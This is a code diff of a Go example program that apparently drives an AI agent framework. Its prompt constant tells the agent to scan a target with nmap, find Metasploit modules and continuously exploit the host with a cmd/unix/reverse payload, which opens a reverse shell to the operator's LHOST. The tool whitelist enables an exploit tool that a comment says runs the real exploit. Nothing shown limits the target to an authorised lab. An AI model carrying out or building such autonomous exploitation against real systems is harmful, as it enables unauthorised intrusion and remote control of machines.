@@ -13,24 +13,14 @@ import (
 	"github.com/rs/zerolog/log"
 )
 
-/*
-	This example shows usage of command executor with rewoo tool, which are whitelisted.
-*/
-
-const Prompt = ` Please scan %s for open ports and generate Metasploit search queries for any found services. Firstly try to use nmap with only -F argument. After that try to continiously exploit target, using %s as LHOST and target address as RHOST and module(s) found from metasploit search. Use cmd/unix/reverse as payload.'`
-
-type NmapToolArgs struct {
-	IP string `json:"ip"`
-}
+const Prompt = `Please scan %s for open ports and generate Metasploit search queries for any found services. ` +
+	`First, try to use nmap with only -F argument. After that try to continiously exploit target, ` +
+	`using %s as LHOST and target address as RHOST and module(s) found from metasploit search. ` +
+	`Use cmd/unix/reverse as payload.'`
 
 func main() {
-	//func Act() {
-
 	zerolog.SetGlobalLevel(zerolog.DebugLevel)
 	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
-
-	//builder
-	//Activate()
 
 	cfg, err := config.NewConfig()
 	if err != nil {
@@ -42,9 +32,8 @@ func main() {
 	toolsExecutor, err := tools.NewToolsExecutor(ctx, cfg, tools.WithToolsWhitelist(
 		tools.ReWOOToolDefinition.Name,
 		tools.CommandExecutorDefinition.Name,
-		tools.NmapToolDefinition.Name,
 		tools.MsfSearchToolDefinition.Name,
-		tools.ExploitToolDefinition.Name, // WARN! THIS WILL RUN THE ACTUAL EXPLOIT, THIS IS DANGEROUSE ZONE! USE IT ONLY WHEN READY!
+		tools.ExploitToolDefinition.Name, // WARN! DANGER ZONE! THIS WILL RUN THE ACTUAL EXPLOIT
 	))
 	if err != nil {
 		log.Fatal().Err(err).Msg("new tools executor")
@@ -64,13 +53,12 @@ func main() {
 		log.Fatal().Msg("HACKER_MSF_LHOST env cannot be empty")
 	}
 
-	fmt.Println(rhost, lhost)
-
-	//return
+	fmt.Printf("Metasploit RHOST: %s, LHOST: %s\n", rhost, lhost)
 
 	rewooQuery := tools.ReWOOToolArgs{
 		Query: fmt.Sprintf(Prompt, rhost, lhost),
 	}
+
 	rewooQueryBytes, err := json.Marshal(rewooQuery)
 	if err != nil {
 		log.Fatal().Err(err).Msg("json marhsal rewooQuery")
